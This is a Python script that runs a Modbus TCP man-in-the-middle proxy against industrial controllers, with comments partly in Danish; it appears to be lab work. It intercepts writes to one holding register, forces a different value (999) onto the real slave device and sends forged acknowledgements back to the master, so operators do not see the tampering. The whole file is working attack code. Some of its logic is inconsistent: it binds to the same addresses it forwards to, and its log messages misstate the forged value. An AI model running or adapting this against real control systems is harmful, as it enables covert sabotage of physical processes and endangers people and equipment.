#!/usr/bin/env python3

import socket
import threading
import struct
import time
from pymodbus.client import ModbusTcpClient

# Network configuration - SEPARATE PORTS!
MASTER_LISTEN_IP = "172.16.4.50"  # Bind specifikt til eth0 IP
MASTER_LISTEN_PORT = 502
SLAVE_LISTEN_IP = "172.16.4.51"   # Bind specifikt til eth1 IP  
SLAVE_LISTEN_PORT = 502

# Real endpoints (original ports)
REAL_MASTER_IP = "172.16.4.50"
REAL_MASTER_PORT = 502
REAL_SLAVE_IP = "172.16.4.51"
REAL_SLAVE_PORT = 502

TARGET_REGISTER = 2
FORCED_VALUE = 999
MASTER_SEES_VALUE = 500

# Global clients for manipulation
slave_client = None

def handle_client(client_sock, src_addr, target_ip, target_port, is_to_slave=False):
    """Håndter en enkelt client forbindelse og proxy til target"""
    direction = "MASTER->SLAVE" if is_to_slave else "SLAVE->MASTER"
    print(f"[+] {direction} {src_addr[0]}:{src_addr[1]} -> {target_ip}:{target_port}")
    
    try:
        # Connect til real target
        target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        target_sock.settimeout(10)
        target_sock.connect((target_ip, target_port))
    except Exception as e:
        print(f"[!] Failed to connect to {target_ip}:{target_port}: {e}")
        client_sock.close()
        return
    
    try:
        while True:
            # Read fra client (max 1024 bytes for Modbus)
            data = client_sock.recv(1024)
            if not data:
                break
            
            print(f"[{direction}] {len(data)} bytes: {data.hex()[:48]}...")
            
            # Parse Modbus PDU (skip MBAP header - 7 bytes)
            if len(data) >= 8:
                function_code = data[7]
                print(f"[Modbus] FC={function_code:02x}")
                
                # Write Single Register (FC=06)
                if function_code == 0x06 and len(data) >= 12:
                    reg_addr = struct.unpack('>H', data[8:10])[0]
                    reg_value = struct.unpack('>H', data[10:12])[0]
                    print(f"[Modbus Write] HR[{reg_addr}] = {reg_value}")
                    
                    if reg_addr == TARGET_REGISTER and is_to_slave:
                        print(f"[MITM HIT!] Master skrev {reg_value}, forcing {FORCED_VALUE} to slave")
                        
                        # Send FORCED_VALUE via PyModbus client
                        if slave_client and slave_client.connected:
                            try:
                                slave_client.write_register(TARGET_REGISTER, FORCED_VALUE, slave_id=1)
                                print(f"[+] SUCCESS: Forced {FORCED_VALUE} to real slave!")
                            except Exception as e:
                                print(f"[!] Manipulation failed: {e}")
                        
                        # Send fake ACK til master (echo request med fake value)
                        fake_response = data[:10] + struct.pack('>H', FORCED_VALUE) + data[12:]
                        client_sock.send(fake_response)
                        print(f"[+] Fake response: HR[{TARGET_REGISTER}]={MASTER_SEES_VALUE}")
                        
                        # Don't forward original write
                        target_sock.close()
                        client_sock.close()
                        return
                
                # Write Multiple Registers (FC=16)
                elif function_code == 0x10 and len(data) >= 13:
                    reg_addr = struct.unpack('>H', data[8:10])[0]
                    if reg_addr == TARGET_REGISTER:
                        print(f"[MITM HIT!] Multi-write to HR[{TARGET_REGISTER}] - forcing {FORCED_VALUE}")
                        # Fake response
                        resp_len = data[11] * 2 + 8  # Calculate response length
                        fake_response = bytes([0]*7) + bytes([0x10]) + bytes([1])  # Simplified
                        client_sock.send(fake_response)
                        return
            
            # Normal proxy - forward data
            target_sock.send(data)
            
            # Read response fra target
            response = target_sock.recv(1024)
            if response:
                client_sock.send(response)
                print(f"[{direction} resp] {len(response)} bytes")
                
    except Exception as e:
        print(f"[!] Proxy error {direction}: {e}")
    finally:
        try:
            client_sock.close()
            target_sock.close()
        except:
            pass

def master_proxy():
    """Proxy: eth0 (172.16.4.50:502) -> real slave"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((MASTER_LISTEN_IP, MASTER_LISTEN_PORT))
    server.listen(10)
    print(f"[+] MASTER proxy: {MASTER_LISTEN_IP}:{MASTER_LISTEN_PORT} -> {REAL_SLAVE_IP}:{REAL_SLAVE_PORT}")
    
    while True:
        client_sock, addr = server.accept()
        client_thread = threading.Thread(
            target=handle_client,
            args=(client_sock, addr, REAL_SLAVE_IP, REAL_SLAVE_PORT, True)
        )
        client_thread.daemon = True
        client_thread.start()

def slave_proxy():
    """Proxy: eth1 (172.16.4.51:502) -> real master"""  
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((SLAVE_LISTEN_IP, SLAVE_LISTEN_PORT))
    server.listen(10)
    print(f"[+] SLAVE proxy: {SLAVE_LISTEN_IP}:{SLAVE_LISTEN_PORT} -> {REAL_MASTER_IP}:{REAL_MASTER_PORT}")
    
    while True:
        client_sock, addr = server.accept()
        client_thread = threading.Thread(
            target=handle_client,
            args=(client_sock, addr, REAL_MASTER_IP, REAL_MASTER_PORT, False)
        )
        client_thread.daemon = True
        client_thread.start()

def init_manipulation_client():
    """PyModbus client for direct slave manipulation"""
    global slave_client
    time.sleep(2)  # Vent på proxy startup
    slave_client = ModbusTcpClient(REAL_SLAVE_IP, port=SLAVE_LISTEN_PORT, timeout=5)
    if slave_client.connect():
        print(f"[+] Manipulation client: {REAL_SLAVE_IP}:{SLAVE_LISTEN_PORT}")
    else:
        print(f"[!] Manipulation client failed")

def main():
    print("=== OT Modbus MITM Socket Proxy (NO CONFLICTS) ===")
    print(f"eth0 proxy: {MASTER_LISTEN_IP}:{MASTER_LISTEN_PORT} -> {REAL_SLAVE_IP}:{REAL_SLAVE_PORT}")
    print(f"eth1 proxy: {SLAVE_LISTEN_IP}:{SLAVE_LISTEN_PORT} -> {REAL_MASTER_IP}:{REAL_MASTER_PORT}")
    print(f"Target: HR[{TARGET_REGISTER}] master={MASTER_SEES_VALUE} | slave={FORCED_VALUE}")
    print()
    
    # Start proxies
    master_thread = threading.Thread(target=master_proxy)
    slave_thread = threading.Thread(target=slave_proxy)
    
    master_thread.daemon = True
    slave_thread.daemon = True
    master_thread.start()
    slave_thread.start()
    
    # Start manipulation client
    init_manipulation_client()
    
    try:
        print("[*] MITM running! Test med modbus tools fra master/slave")
        print("Kill med Ctrl+C")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Shutdown...")
        if slave_client:
            slave_client.close()

if __name__ == "__main__":
    main()